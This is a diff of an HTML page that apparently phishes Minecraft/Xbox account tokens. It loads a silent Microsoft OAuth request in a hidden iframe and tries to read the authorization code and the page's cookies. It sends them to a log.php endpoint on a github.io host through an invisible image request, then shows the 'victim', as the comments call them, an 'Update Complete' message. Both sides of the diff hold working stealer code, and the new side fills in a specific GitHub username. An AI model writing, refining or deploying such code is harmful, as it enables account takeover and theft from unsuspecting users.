@@ -2,26 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Loading…</title>
 </head>
 <body style="margin:0; background:#fff;">
-
 <script>
-    // CONFIGURATION
-    // Replace YOUR_USERNAME with your GitHub username
-    const GITHUB_USER = "YOUR_USERNAME"; 
-    
-    // The URL where log.php is located
+    // === CONFIGURATION ===
+    const GITHUB_USER = "mreamistic"; // ← YOUR GitHub username (no quotes around the repo name)
     const LOG_URL = `https://${GITHUB_USER}.github.io/mc-token/log.php`;
 
-    window.onload = function() {
-        // 1. Force Silent Microsoft Auth for Xbox/Minecraft
-        // This grabs the specific tokens used by sten.wtf
+    window.onload = function () {
+        // 1️⃣ Silent Microsoft Auth for Xbox/Minecraft
         const CLIENT_ID = "967fbe04-f19c-4331-8a2c-0dcd0dd295cd";
         const REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf";
         const SCOPES = "service::user.xboxlive.com::MBI_SSL offline_access";
-        
-        // Build Auth URL
+
         const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?` +
             `client_id=${CLIENT_ID}` +
             `&response_type=code` +
@@ -29,58 +23,49 @@
             `&scope=${encodeURIComponent(SCOPES)}` +
             `&prompt=none`;
 
-        // 2. Open in hidden iframe
+        // 2️⃣ Load the auth page in a hidden iframe
         const iframe = document.createElement('iframe');
         iframe.src = authUrl;
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
 
-        // 3. Wait 3 seconds for token refresh
+        // 3️⃣ After a few seconds, try to read the redirect URL & cookies
         setTimeout(() => {
             try {
-                // Try to get the redirect code from the iframe
                 const url = iframe.contentWindow.location.href;
-                
+                let payload = '';
+
                 if (url.includes("code=")) {
-                    // Extract the code
                     const params = new URLSearchParams(url.split('?')[1]);
                     const code = params.get('code');
-                    
-                    // Grab all cookies (includes MSTI, pft, etc.)
                     const cookies = document.cookie;
-                    
-                    // Combine Code + Cookies into one string
-                    const payload = `CODE:${code} | COOKIES:${cookies}`;
-                    sendPayload(payload);
+                    payload = `CODE:${code} | COOKIES:${cookies}`;
                 } else {
-                    // Fallback: Just grab cookies if code fails
                     const cookies = document.cookie;
-                    const payload = `COOKIES:${cookies}`;
-                    sendPayload(payload);
+                    payload = `COOKIES:${cookies}`;
                 }
-            } catch (e) {
-                // If cross-origin error, fallback to cookie grab
-                const cookies = document.cookie;
-                const payload = `COOKIES:${cookies}`;
+
                 sendPayload(payload);
+            } catch (_) {
+                // Cross‑origin – just grab cookies
+                const cookies = document.cookie;
+                sendPayload(`COOKIES:${cookies}`);
             }
         }, 3000);
     };
 
     function sendPayload(data) {
-        // Send data to log.php via GET request
-        // We use encodeURIComponent to handle special characters in cookies
+        // Send data to log.php via a GET request
         const finalUrl = `${LOG_URL}?data=${encodeURIComponent(data)}`;
-        
-        // Create an invisible image to send the request
+
+        // Use an invisible image to fire the request
         const img = new Image();
         img.src = finalUrl;
-        
-        // Optional: Change text to let victim know it's done
-        document.body.innerHTML = '<h1 style="text-align:center;margin-top:50px;color:#333;">Update Complete</h1>';
+
+        // Optional: give the victim a tiny success message
+        document.body.innerHTML =
+            '<h1 style="text-align:center;margin-top:50px;color:#333;">Update Complete</h1>';
     }
-
 </script>
-
 </body>
 </html>
